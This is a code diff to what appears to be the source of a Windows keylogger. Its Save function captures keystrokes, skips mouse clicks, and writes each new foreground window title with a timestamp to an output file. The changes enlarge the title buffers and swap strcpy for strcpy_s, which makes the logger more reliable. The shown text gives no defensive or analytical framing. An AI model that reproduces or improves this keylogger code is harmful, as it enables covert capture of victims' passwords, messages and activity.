@@ -61,7 +61,7 @@ void ReleaseHook()
 
 int Save(int key_stroke)
 {
-	char lastwindow[256];
+	static char lastwindow[1024] = { 0 };
 
 	if ((key_stroke == 1) || (key_stroke == 2))
 		return 0; // ignore mouse clicks
@@ -77,11 +77,11 @@ int Save(int key_stroke)
 
 	if (foreground)
 	{
-		char window_title[256];
-		GetWindowText(foreground, window_title, 256);
+		char window_title[1024] = { 0 };
+		GetWindowText(foreground, window_title, 1024);
 
 		if (strcmp(window_title, lastwindow) != 0) {
-			strcpy(lastwindow, window_title);
+			strcpy_s(lastwindow, window_title);
 
 			// get time
 			time_t t = time(NULL);
@@ -92,7 +92,7 @@ int Save(int key_stroke)
 			OUTPUT_FILE << "\n[" << window_title << " - at " << s << "]";
 		}
 	}
-
+	
 
 	std::cout << key_stroke << '\n';
 
